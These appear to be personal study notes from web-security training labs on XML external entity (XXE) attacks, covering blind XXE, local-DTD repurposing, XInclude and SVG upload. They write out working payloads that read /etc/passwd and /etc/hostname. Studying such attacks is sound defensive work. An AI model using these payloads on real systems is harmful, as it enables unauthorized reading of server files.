[[XXE]]
## XXE to SSRF
exploiting XXE to perform SSRF attacks

![[Pasted_image_20250906104118.png]]

## Blind XXE

COuldn't do the out of band labs because:

> [!info]
> To prevent the Academy platform being used to attack third parties, our firewall blocks interactions between the labs and arbitrary external systems. To solve the lab, you must use Burp Collaborator's default public server.


### Exploiting blind XXE to retrieve data via error messages

![[Pasted_image_20250906112204.png]]


We can bypass this by hosting our exploit to an external server. This time we are provided with an exploit server.

store the exploit in the server. dont forget to press the store button.

![[Pasted_image_20250906114119.png]]

then build you exploit like this..

![[Pasted_image_20250906114158.png]]


## Exploiting blind XXE by repurposing a local DTD

first we need to locate an internal dtd file 
![[Pasted_image_20250906122904.png]]


we have identified a internal dtd file
![[Pasted_image_20250906123614.png]]

now that we have identified a file to work with, we need to inspect the file to determine the entity to repurpose.

SInce we have the file in our local system (am using linux) we can just read it.

```
cat /usr/share/xml/fontconfig/fonts.dtd   
<!-- This is the Document Type Definition for font configuration files -->
<!ELEMENT fontconfig (alias |
		      cache | 
		      cachedir |
		      config |
		      description |
		      dir |
		      include |
		      match |
		      remap-dir |
		      reset-dirs |
		      selectfont)* >

<!-- 
    Add a directory that provides fonts
-->
<!ELEMENT dir (#PCDATA)>
<!ATTLIST dir

[SNIP]

<!ENTITY % constant 'int|double|string|matrix|bool|charset|langset|const'>

<!ELEMENT patelt (%constant;)*>
<!ATTLIST patelt
	  name CDATA	#REQUIRED>

<!ELEMENT alias (test?, family*, prefer?, accept?, default?)>
<!ATTLIST alias

[SNIP]
```


rebuilding our exploit

```
<!DOCTYPE foo [ <!ENTITY % local_dtd SYSTEM "file:///usr/share/xml/fontconfig/fonts.dtd"> 
<!ENTITY % constant ' <!ENTITY &#x25; file SYSTEM "file:///etc/passwd"> 
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>"> &#x25;eval; &#x25;error; '>
%local_dtd; 
]>
```

![[Pasted_image_20250906130041.png]]

i found this repo which helped me solve this error 

https://github.com/GoSecure/dtd-finder/blob/master/list/xxe_payloads.md

![[Pasted_image_20250906130424.png]]

### XInclude attacks

![[Pasted_image_20250909053055.png]]


### XXE via file upload

```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
   <text font-size="16" x="0" y="16">&xxe;</text>
</svg>
```

upload the file as an svg image and then inspect the page that displays the uploaded image.


